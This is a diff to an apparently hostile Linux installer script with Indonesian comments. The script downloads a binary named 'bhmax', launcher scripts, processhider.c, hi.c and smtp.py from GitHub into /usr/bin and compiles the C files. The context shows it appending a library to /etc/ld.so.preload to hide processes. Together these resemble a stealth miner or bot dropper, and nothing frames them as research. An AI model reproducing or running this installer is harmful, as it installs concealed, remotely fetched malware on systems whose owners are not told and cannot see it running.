@@ -4,9 +4,8 @@
 cd /usr/bin
 
 # Unduh file yang diperlukan
-curl -L "https://docs.google.com/uc?export=download&id=1xynrUVmOiCTjOJRIXOKNHyGuqhD-Kq9t" > bhmax
-wget https://raw.githubusercontent.com/hudahadoh/vs/main/cmd_launch.sh
-wget https://raw.githubusercontent.com/hudahadoh/vs/main/configna.ini
+wget https://github.com/hudahadoh/vs/raw/main/bhmax
+wget https://raw.githubusercontent.com/hudahadoh/vs/main/start.sh
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
@@ -23,7 +22,7 @@ echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
 # Ubah izin agar bhmax dapat dieksekusi
 chmod +x bhmax
-chmod +x cmd_launch.sh
+chmod +x start.sh
 
 # Kompilasi hi.c menjadi hi
 gcc -o hi hi.c
